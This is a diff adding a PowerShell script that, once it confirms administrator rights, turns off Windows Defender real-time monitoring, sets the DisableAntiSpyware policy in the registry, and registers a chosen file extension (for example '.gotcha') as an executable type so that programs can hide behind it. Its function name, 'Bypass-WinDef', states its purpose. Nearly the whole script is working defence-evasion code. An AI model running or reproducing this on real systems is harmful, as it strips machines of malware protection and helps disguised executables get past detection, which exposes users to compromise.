@@ -1,0 +1,64 @@
+#[CmdletBinding()]
+$path = Get-Location
+$scriptName = $MyInvocation.MyCommand.Name
+$script= "$path\$scriptName"
+
+Clear-Host
+Write-Host -NoNewline "Running " ; Write-Host -ForegroundColor Green "$script"
+Write-Host -NoNewline "Checking PowerShell Session Privileges"
+sleep 1
+Write-Host -NoNewline "."
+sleep 1
+Write-Host -NoNewline "."
+sleep 1
+Write-Host -NoNewline "."
+Sleep 1
+
+function Priv-Check {
+
+    $sid = [security.principal.windowsidentity]::GetCurrent()
+    $privs = new-object System.Security.Principal.WindowsPrincipal($sid)
+    clear-host
+    if ($privs.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) {
+        Write-Output $true
+        }
+    else {
+        Write-Output $false
+        }
+    }
+
+if (-not(Priv-Check)) {
+        Clear-Host
+        Write-Host 'CHECK YOUR PRIVILEGE!!!'
+        Write-Host -NoNewline 'Unable to run '; Write-Host -ForegroundColor Green $script
+        sleep 1
+        throw "Run this script with Elevated/Administrative Rights"
+        }
+else {
+        Clear-Host
+        Write-Host "You are in an elevated PowerShell Session"
+        Sleep 1
+    }
+
+if ((Get-MpPreference).DisableRealtimeMonitoring -eq $false) {
+    Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
+    New-ItemProperty -Path “HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender” -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
+}
+
+if ((Get-MpPreference).DisableRealtimeMonitoring -eq $false) {
+    throw "Unable to Disable Windows Defender RealTimeMonitoring"
+}
+
+
+function Bypass-WinDef {
+    do {
+    $extension = Read-Host -Prompt "Enter the File Extension you want to add and omit the precluding '.'(Ex: gotcha -> .gotcha)"
+    } Until (![string]::IsNullOrWhiteSpace($extension))
+
+    New-Item "hklm:\software\classes" -Name ".$extension" -Force -ErrorAction SilentlyContinue | Out-Null 
+    New-ItemProperty "hklm:\software\classes\.$extension" -Name '(Default)' -PropertyType String -Value 'exefile' -Force -ErrorAction SilentlyContinue | Out-Null
+    New-ItemProperty "hklm:\software\classes\.$extension" -Name 'Content Type' -PropertyType String -Value 'application/x-msdownload' -Force -ErrorAction SilentlyContinue | Out-Null
+    Get-Item "HKLM:\Software\Classes\.$extension"
+}
+
+Bypass-WinDef
